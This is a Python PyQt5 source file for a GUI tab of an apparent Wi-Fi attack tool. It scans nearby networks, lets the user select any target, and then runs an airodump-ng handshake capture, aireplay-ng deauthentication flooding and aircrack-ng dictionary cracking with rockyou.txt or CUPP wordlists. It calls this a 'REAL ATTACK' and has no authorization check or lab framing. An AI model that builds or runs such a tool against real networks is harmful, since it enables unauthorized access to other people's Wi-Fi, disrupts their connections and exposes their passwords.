import sys
import subprocess
import time
import os
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QPushButton, QComboBox, QLineEdit, QFileDialog, 
                             QTextEdit, QGroupBox, QRadioButton, QTableWidget, QTableWidgetItem, QHeaderView)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from modules.network_scanner import NetworkScanner
from modules.handshake_capture import HandshakeCapture
from modules.password_cracker import PasswordCracker

class RealAttackThread(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, interface, bssid, channel, wordlist_path, ssid):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.wordlist_path = wordlist_path
        self.ssid = ssid
        self.handshake_capture = None
        self.cracker = None

    def run(self):
        try:
            self.log_signal.emit(f"[*] Target: {self.ssid} ({self.bssid})")
            self.log_signal.emit(f"[*] Interface: {self.interface}")
            self.log_signal.emit(f"[*] Channel: {self.channel}")
            self.log_signal.emit("")
            
            self.log_signal.emit("[*] STEP 1: Starting packet capture (airodump-ng)...")
            self.handshake_capture = HandshakeCapture(self.interface, self.bssid, self.channel)
            self.handshake_capture.start_capture()
            self.log_signal.emit("[+] Airodump-ng started. Waiting for clients...")
            
            self.log_signal.emit("")
            self.log_signal.emit("[*] STEP 2: Sending deauthentication packets (aireplay-ng)...")
            self.handshake_capture.send_deauth(count=20)
            self.log_signal.emit("[+] Deauth packets sent!")
            
            self.log_signal.emit("")
            self.log_signal.emit("[*] STEP 3: Waiting for WPA handshake capture...")
            time.sleep(5)
            
            cap_file = self.handshake_capture.get_cap_file()
            self.log_signal.emit(f"[*] Checking capture file: {cap_file}")
            
            self.handshake_capture.stop_capture()
            time.sleep(2)
            
            if os.path.exists(cap_file):
                self.log_signal.emit(f"[+] Capture file created successfully!")
                self.log_signal.emit(f"[+] File size: {os.path.getsize(cap_file)} bytes")
            else:
                self.log_signal.emit("[!] Error: Capture file not created!")
                self.log_signal.emit("[!] Make sure your Wi-Fi adapter supports monitor mode.")
                self.finished_signal.emit()
                return
            
            self.log_signal.emit("")
            self.log_signal.emit("[*] STEP 4: Starting password crack (aircrack-ng)...")
            self.log_signal.emit("")
            
            self.cracker = PasswordCracker(cap_file, self.wordlist_path)
            
            for output_line in self.cracker.crack_password():
                self.log_signal.emit(output_line)
            
            if self.cracker.found_password:
                self.log_signal.emit("")
                self.log_signal.emit("=" * 50)
                self.log_signal.emit("  PASSWORD SUCCESSFULLY CRACKED!")
                self.log_signal.emit(f"  SSID: {self.ssid}")
                self.log_signal.emit(f"  PASSWORD: {self.cracker.found_password}")
                self.log_signal.emit("=" * 50)
            
        except Exception as e:
            self.log_signal.emit(f"[!] Exception: {str(e)}")
            self.log_signal.emit("[!] Make sure you are running with sudo and on Linux.")
        finally:
            if self.handshake_capture:
                self.handshake_capture.stop_capture()
            self.finished_signal.emit()

class CrackerTab(QWidget):
    def __init__(self):
        super().__init__()
        self.setup_ui()
        self.attack_thread = None
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(5)
        layout.setContentsMargins(5, 5, 5, 5)
        
        iface_group = QGroupBox("1. Network Interface")
        iface_layout = QHBoxLayout()
        iface_layout.addWidget(QLabel("Interface:"))
        self.combo_interface = QComboBox()
        self.combo_interface.addItem("auto")
        iface_layout.addWidget(self.combo_interface)
        btn_refresh = QPushButton("Refresh")
        btn_refresh.clicked.connect(self.refresh_interfaces)
        iface_layout.addWidget(btn_refresh)
        self.refresh_interfaces()
        iface_group.setLayout(iface_layout)
        layout.addWidget(iface_group)
        
        scan_group = QGroupBox("2. Target Selection")
        scan_layout = QVBoxLayout()
        
        self.btn_scan = QPushButton("?? Auto Scan Networks")
        self.btn_scan.clicked.connect(self.scan_networks)
        scan_layout.addWidget(self.btn_scan)
        
        self.table = QTableWidget(0, 4)
        self.table.setHorizontalHeaderLabels(["SSID", "BSSID", "Ch", "Sig"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.table.setSelectionBehavior(QTableWidget.SelectRows)
        self.table.setMaximumHeight(100)
        scan_layout.addWidget(self.table)
        scan_group.setLayout(scan_layout)
        layout.addWidget(scan_group)
        
        dict_group = QGroupBox("3. Wordlist")
        dict_layout = QVBoxLayout()
        
        self.radio_default = QRadioButton("Default (rockyou.txt)")
        self.radio_default.setChecked(True)
        self.radio_custom = QRadioButton("Custom Wordlist")
        
        dict_layout.addWidget(self.radio_default)
        dict_layout.addWidget(self.radio_custom)
        
        custom_layout = QHBoxLayout()
        self.txt_wordlist = QLineEdit()
        self.txt_wordlist.setPlaceholderText("/path/to/wordlist.txt")
        self.txt_wordlist.setEnabled(False)
        self.radio_custom.toggled.connect(lambda: self.txt_wordlist.setEnabled(self.radio_custom.isChecked()))
        
        btn_browse = QPushButton("Browse")
        btn_browse.setMaximumWidth(80)
        btn_browse.clicked.connect(self.browse_wordlist)
        
        custom_layout.addWidget(self.txt_wordlist)
        custom_layout.addWidget(btn_browse)
        dict_layout.addLayout(custom_layout)
        
        self.btn_cupp = QPushButton("Generate with CUPP")
        self.btn_cupp.clicked.connect(self.launch_cupp)
        dict_layout.addWidget(self.btn_cupp)
        
        dict_group.setLayout(dict_layout)
        layout.addWidget(dict_group)
        
        attack_group = QGroupBox("4. Execute Attack")
        attack_layout = QVBoxLayout()
        
        self.btn_attack = QPushButton("? LAUNCH REAL ATTACK")
        self.btn_attack.setStyleSheet("background-color: #330000; color: #ff0000; font-weight: bold; border: 2px solid red; padding: 8px;")
        self.btn_attack.clicked.connect(self.start_attack)
        attack_layout.addWidget(self.btn_attack)
        
        self.terminal = QTextEdit()
        self.terminal.setReadOnly(True)
        self.terminal.setMaximumHeight(200)
        self.terminal.setText("[*] Ready. Select network and click LAUNCH REAL ATTACK\n[!] NOTE: Requires sudo, Linux, and Wi-Fi adapter with monitor mode support")
        attack_layout.addWidget(self.terminal)
        
        attack_group.setLayout(attack_layout)
        layout.addWidget(attack_group)
        layout.addStretch()

    def refresh_interfaces(self):
        self.combo_interface.clear()
        self.combo_interface.addItem("auto")
        interfaces = NetworkScanner.get_interfaces()
        for iface in interfaces:
            self.combo_interface.addItem(iface)

    def scan_networks(self):
        self.terminal.setText("[*] Scanning networks...")
        self.table.setRowCount(0)
        nets = NetworkScanner.scan_networks()
        for net in nets:
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setItem(row, 0, QTableWidgetItem(net["ssid"]))
            self.table.setItem(row, 1, QTableWidgetItem(net["bssid"]))
            self.table.setItem(row, 2, QTableWidgetItem(net.get("ch", "N/A")))
            self.table.setItem(row, 3, QTableWidgetItem(net["pwr"]))
        self.terminal.append(f"[+] Found {len(nets)} networks.")

    def launch_cupp(self):
        try:
            if sys.platform == "win32":
                subprocess.Popen(["cmd.exe", "/c", "start", "python", "modules/cupp/cupp.py", "-i"])
            else:
                subprocess.Popen(["xterm", "-e", "python3", "modules/cupp/cupp.py", "-i"])
            self.terminal.append("[+] Launched CUPP in terminal.")
        except Exception as e:
            self.terminal.append(f"[!] Error: {e}")

    def browse_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist", "/", "Text Files (*.txt)")
        if file_path:
            self.txt_wordlist.setText(file_path)

    def start_attack(self):
        selected = self.table.selectedItems()
        if not selected:
            self.terminal.setText("[!] Error: No target network selected.")
            return
        
        row = selected[0].row()
        ssid = self.table.item(row, 0).text()
        bssid = self.table.item(row, 1).text()
        channel = self.table.item(row, 2).text()
        
        if channel == "N/A":
            self.terminal.setText("[!] Error: Channel information missing.")
            return
        
        interface = self.combo_interface.currentText()
        
        if self.radio_default.isChecked():
            wordlist = "/usr/share/wordlists/rockyou.txt"
        else:
            wordlist = self.txt_wordlist.text()
        
        if not os.path.exists(wordlist):
            self.terminal.setText(f"[!] Error: Wordlist not found: {wordlist}")
            return
        
        self.btn_attack.setEnabled(False)
        self.terminal.clear()
        self.terminal.append(f"[*] Starting real WPA crack attack on {ssid}...")
        self.terminal.append("")
        
        self.attack_thread = RealAttackThread(interface, bssid, channel, wordlist, ssid)
        self.attack_thread.log_signal.connect(self.terminal.append)
        self.attack_thread.finished_signal.connect(lambda: self.btn_attack.setEnabled(True))
        self.attack_thread.start()
